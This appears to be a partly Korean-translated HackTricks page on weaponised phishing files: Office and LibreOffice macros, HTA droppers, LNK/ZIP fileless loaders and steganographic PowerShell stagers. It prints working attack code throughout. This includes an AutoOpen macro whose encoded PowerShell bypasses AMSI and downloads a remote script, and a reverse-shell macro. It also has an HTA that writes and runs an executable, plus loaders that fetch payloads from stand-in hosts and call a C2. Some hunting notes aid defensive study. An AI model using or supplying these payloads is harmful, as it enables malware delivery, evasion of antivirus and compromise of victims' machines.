# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word는 파일을 열기 전에 파일 데이터 검증을 수행합니다. 데이터 검증은 OfficeOpenXML standard에 대한 데이터 구조 식별 형태로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면, 분석 중인 파일은 열리지 않습니다.

일반적으로 macro가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경해 파일 이름을 바꿔도 macro 실행 기능은 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 macros를 지원하지 않지만, RTF로 이름이 바뀐 DOCM 파일은 Microsoft Word에 의해 처리되며 macro execution이 가능합니다.\
동일한 내부 구조와 메커니즘은 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

다음 명령어를 사용해 일부 Office programs에서 어떤 확장자가 실행되는지 확인할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 파일이 매크로를 포함한 원격 템플릿(File –Options –Add-ins –Manage: Templates –Go)을 참조하면, 매크로도 “실행”될 수 있습니다.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

문서에서 macros를 사용해 임의 코드를 실행하는 것이 가능합니다.

#### Autoload functions

이들이 더 흔할수록, AV가 이를 탐지할 가능성도 더 높아집니다.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터를 수동으로 제거

**File > Info > Inspect Document > Inspect Document**로 이동하면 Document Inspector가 열립니다. **Inspect**를 클릭한 다음 **Document Properties and Personal Information** 옆의 **Remove All**을 클릭합니다.

#### Doc Extension

완료되면 **Save as type** 드롭다운을 선택하고 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**으로 변경하세요.\
이렇게 하는 이유는 **`.docx`** 안에는 macro를 저장할 수 없고, macro-enabled **`.docm`** extension에는 **stigma**가 **around** 있기 때문입니다(예: 썸네일 아이콘에 큰 `!`가 표시되고 일부 web/email gateway는 이를 완전히 차단함). 따라서 이 **legacy `.doc` extension**이 가장 좋은 절충안입니다.

#### 악성 Macros 생성기

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer 문서는 Basic macros를 포함할 수 있으며, 파일이 열릴 때 macro를 **Open Document** 이벤트에 바인딩하여 자동 실행할 수 있습니다(Tools → Customize → Events → Open Document → Macro…). 간단한 reverse shell macro는 다음과 같습니다:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.

Delivery tips:

- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.

## HTA Files

An HTA is a Windows program that **HTML와 scripting languages (such as VBScript and JScript)를 결합**합니다. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **Internet Explorer와 함께 설치**되며, `mshta`는 IE에 **의존**합니다. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

NTLM authentication을 **"원격으로" 강제로** 수행하게 만드는 방법은 여러 가지가 있습니다. 예를 들어, 사용자가 접근하게 될 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(심지어 HTTP MitM도 가능?). 또는 피해자에게 **폴더를 여는 것만으로** **authentication**을 **트리거**하는 **파일 경로**를 보낼 수도 있습니다.

**다음 페이지에서 이런 아이디어와 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

해시나 authentication만 훔칠 수 있는 것이 아니라 **NTLM relay 공격**도 수행할 수 있다는 점을 잊지 마세요:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 캠페인은 두 개의 정상적인 미끼 문서(PDF/DOCX)와 악성 .lnk가 들어 있는 ZIP을 전달합니다. 핵심은 실제 PowerShell loader가 고유한 marker 뒤의 ZIP 원시 바이트 안에 저장되어 있고, .lnk가 이를 잘라내어 메모리에서 완전히 실행한다는 점입니다.

.lnk PowerShell one-liner로 구현되는 일반적인 흐름:

1) 공통 경로에서 원본 ZIP 찾기: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 그리고 현재 작업 디렉터리의 상위 폴더.
2) ZIP 바이트를 읽고 하드코딩된 marker(예: xFIQCV)를 찾기. marker 뒤의 모든 내용이 내장된 PowerShell payload입니다.
3) ZIP을 %ProgramData%로 복사하고, 거기서 압축을 풀고, 정상적으로 보이도록 미끼 .docx를 엽니다.
4) 현재 프로세스에 대해 AMSI 우회: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 stage의 난독화를 제거(예: 모든 # 문자 삭제)하고 메모리에서 실행합니다.

내장된 stage를 잘라내고 실행하는 PowerShell skeleton 예제:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery는 종종 평판이 좋은 PaaS 서브도메인(예: *.herokuapp.com)을 악용하고, IP/UA에 따라 payload를 차단할 수 있습니다(예: benign ZIP 제공).
- 다음 stage는 흔히 base64/XOR shellcode를 decrypt한 뒤 Reflection.Emit + VirtualAlloc로 실행하여 disk artifact를 최소화합니다.

같은 chain에서 사용된 Persistence
- Microsoft Web Browser control의 COM TypeLib hijacking을 통해 IE/Explorer 또는 이를 embedding하는 어떤 app이든 payload를 자동으로 다시 실행하게 합니다. 세부 사항과 바로 사용할 수 있는 command는 여기에서 확인하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- archive data 뒤에 ASCII marker string(예: xFIQCV)이 추가된 ZIP files.
- ZIP을 찾기 위해 parent/user folders를 열거하고 decoy document를 여는 .lnk.
- [System.Management.Automation.AmsiUtils]::amsiInitFailed를 통한 AMSI tampering.
- trusted PaaS domains 아래에서 호스팅된 links로 끝나는 장시간 실행되는 business threads.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

또 다른 반복 패턴은 **document-impersonating `.lnk`**로, 백그라운드에서 실제 chain을 stage하는 동안 즉시 benign lure를 엽니다.

관찰된 workflow:
1. shortcut은 **PDF로 masquerade**하며 conhost.exe 또는 유사한 proxy를 사용해 obfuscated PowerShell downloader를 실행합니다.
2. PowerShell은 명백한 token(`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`)을 분리해 단순 탐지에서 `iwr`, `gci`, `ren`, `cpi`, `schtasks`를 찾지 못하게 합니다.
3. stager는 **decoy document를 먼저** 다운로드해 victim에게 열어주고, 그 다음 background에서 악성 file을 재구성합니다.
4. payload는 **junk extension**으로 기록된 뒤 filler character를 제거해 rename될 수 있으며, 이로 인해 눈에 띄는 `.exe` / `.cpl` artifact의 등장이 지연됩니다.
5. Persistence는 **minute-based scheduled task**로 설정되며, user-writable path에서 trusted host binary를 실행합니다.

이 pattern에서 얻을 수 있는 최소 hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
유용하게 인식할 수 있는 staging 레이아웃은 다음과 같습니다:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 또는 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 왜 second stage가 stealthy한가

Rapid7 사례 연구에서 scheduled task는 **`Fondue.exe`**를 `C:\Users\Public\`에서 반복적으로 실행했습니다. **`APPWIZ.cpl`**이 그 옆에 staged 되었고 **`RunFODW`**를 export했기 때문에, 신뢰받는 Microsoft binary가 공격자의 CPL을 legitimate system copy 대신 sideload했습니다.

그런 다음 CPL은:
- **AES-256-CBC** blob을 `C:\Windows\Tasks\editor.dat`에서 읽음
- **Windows CNG / `bcrypt.dll`**을 통해 복호화
- executable memory를 할당하고 복호화된 shellcode를 복사
- shellcode pointer를 **`EnumUILanguagesW`**의 callback으로 전달해 indirect로 실행

이 마지막 단계는 따로 hunting할 가치가 있습니다: malware는 종종 직접적인 `((void(*)())buf)()` 점프를 피하고, 대신 **legitimate callback-taking WinAPI**를 악용해 execution을 넘깁니다.

이 캠페인의 decrypted payload는 **Donut** shellcode였고, 이후 최종 PE를 memory에서 완전히 매핑한 뒤 현재 process에서 **AMSI/WLDP/ETW**를 patch하고 execution을 넘겼습니다. sideloading과 memory-resident post-processing에 대한 더 자세한 내용은 다음을 참고하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

실용적인 hunting pivot:
- `.lnk`가 `powershell.exe` 또는 `conhost.exe`를 실행한 뒤 눈에 보이는 decoy document가 이어짐.
- **`C:\Users\Public\`**로의 단기 다운로드 후 즉시 nonsense extension에서 rename.
- `GoogleErrorReport` 같은 bland name의 scheduled task가 **user-writable directories**에서 실행됨.
- 신뢰받는 binary가 같은 non-system directory에서 **`.cpl` / `.dll`** 파일을 로드함.
- **`C:\Windows\Tasks\`** 아래에 작성된 Base64 text blob을 side-loaded module이 읽음.

## 이미지 안의 steganography-delimited payloads (PowerShell stager)

최근 loader chain은 난독화된 JavaScript/VBS를 전달해 Base64 PowerShell stager를 디코딩하고 실행합니다. 그 stager는 이미지(종종 GIF)를 다운로드하는데, 그 안에는 고유한 시작/종료 marker 사이에 plain text로 숨겨진 Base64-encoded .NET DLL이 들어 있습니다. 스크립트는 이러한 delimiter를 검색하고(실제 사례에서 본 예: «<<sudo_png>> … <<sudo_odt>>>»), 그 사이의 텍스트를 추출해 Base64-decode로 bytes로 바꾼 뒤, assembly를 in-memory로 로드하고 C2 URL과 함께 알려진 entry method를 호출합니다.

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64를 디코딩 → `-nop -w hidden -ep bypass`와 함께 PowerShell stager 실행.
- Stage 2: PowerShell stager → 이미지 다운로드, marker-delimited Base64 추출, .NET DLL을 in-memory로 로드하고 그 method(예: VAI)를 호출하며 C2 URL과 options 전달.
- Stage 3: Loader가 최종 payload를 가져오고, 보통 process hollowing으로 trusted binary(대개 MSBuild.exe)에 주입함. process hollowing과 trusted utility proxy execution에 대한 더 많은 내용은 여기에서 보세요:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

이미지에서 DLL을 carve out하고 in-memory로 .NET method를 호출하는 PowerShell 예제:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing images and immediately decoding Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- Read own file contents
- Locate a Base64 blob between junk strings
- Decode to ASCII PowerShell
- Execute with `wscript.exe`/`cscript.exe` invoking `powershell.exe`

Hunting cues
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Check the page about **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
